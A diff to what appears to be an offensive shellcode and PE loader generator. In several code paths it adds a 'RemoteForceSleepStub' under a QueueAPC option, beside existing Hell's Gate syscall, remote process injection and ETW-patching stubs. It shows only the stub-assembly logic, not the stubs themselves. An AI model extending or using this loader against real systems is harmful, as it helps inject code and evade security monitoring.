@@ -2337,6 +2337,8 @@ if (peload):
         if (hellsgate):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(RemotePatchETWStub)
@@ -2348,6 +2350,8 @@ if (peload):
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(RemotePatchETWStub)
@@ -2372,6 +2376,8 @@ if (shellcode):
         if (hellsgate):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(RemotePatchETWStub)
@@ -2383,6 +2389,8 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(getRandStub())
@@ -2396,6 +2404,8 @@ if (shellcode):
             if (processname == ""):
                 stub.add(getRandStub())
                 stub.add(NotepadProcIDStub)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(getRandStub())
@@ -2409,6 +2419,8 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(getRandStub())
@@ -2422,6 +2434,8 @@ if (shellcode):
             stub.add(getRandStub())
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(getRandStub())
@@ -2436,6 +2450,8 @@ if (shellcode):
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
+                if (useQueueAPC):
+                    stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
                     stub.add(RemoteLoadNTDLLStub)
                     stub.add(getRandStub())
